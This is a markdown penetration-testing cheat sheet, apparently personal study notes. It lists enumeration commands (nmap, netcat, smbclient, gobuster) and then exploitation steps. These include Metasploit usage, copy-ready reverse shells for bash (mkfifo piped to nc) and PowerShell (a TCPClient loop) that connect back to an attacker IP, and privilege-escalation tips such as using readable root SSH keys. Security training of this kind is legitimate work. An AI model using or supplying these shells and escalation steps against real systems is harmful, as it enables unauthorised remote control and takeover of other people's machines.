# Enumerations
This section contains quick commands for different types of enumerations
## Network Enumeration
This sub-section contains a bunch of commands for network services enumeration
#### Nmap Command
```bash
nmap -sV -sC <TARGET_IP>
```
What each flag does:
- `-sC`: Specifies that **Nmap scripts** should be used to try and obtain more detailed information
- `-sV`: Instruct Nmap to perform a **version scan**. This fingerprints the services on the target system and identifies the **service protocol,** **application name**, and **version**
#### Banner Grabbing
```bash
nc -nv <TARGET_IP> <PORT>
```
#### SMB Enumeration
```bash
# List available shares; -N means no password
smbclient -N -L //<TARGET_IP>
```
```bash
smbclient -U bob \\\\<TARGET_IP>/<PATH> # PATH wiill be taken from previous command
```


## Web Enumeration
This sub-section contains a bunch of commands for Enumeration of Web Services
#### Directory/File Enumeration
```bash
gobuster dir -u <TARGET_WEBSITE> -w <WORDLIST>
```
- `-u`: Specifies the target URL (e.g., http://100.120.145.51)
- `-w`: Specifies the wordlist. The best one to use is `/usr/share/seclists/Discovery/Web-Content/common.txt`
#### DNS Enumeration
```shell
gobuster dns --do <TARGET_DOMAIN> -w <WORDLIST>
```
- `<WORDLIST>` can be `/usr/share/seclists/Discover/DNS/namelist.txt`
#### Banner Grabbing
```bash
curl -IL <TARGET_WEBSITE>
```
and/or
```bash
whatweb <TARGET_WEBSITE>
```
# Exploitation
This section contains basic commands for exploitation stuff
#### Finding Public Exploits
```bash
searchsploit <SERVICE> <VERSION>
```
#### Metasploit Framework (MSF)
```bash
msfconsole
# This puts you into the metasploit console
msf > search exploit <EXPLOIT_NAME>
msf > use <EXPLOIT_ID>
msf > show options
msf > show payloads
msf > set <PARAM>
check
exploit # or run can also be used 
```
#### Reverse Shell
```bash
# On your attacker machine
nc -lvnp <PORT>
```
```bash
# Execute this command on the victim (via RCE)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
```
```powershell
# Powershell version for windows RCE
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
#### Upgrading TTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
#### Privilege Escalation
```bash
sudo -l # Check for sudo privileges
```
- Also you can run **LinEnum.sh** or **LinPEAS** for privilege escalation on linux based systems
- Check for `ssh` keys in the root directory or for other users. If readable by your current user, you can use the root ssh keys to gain root access.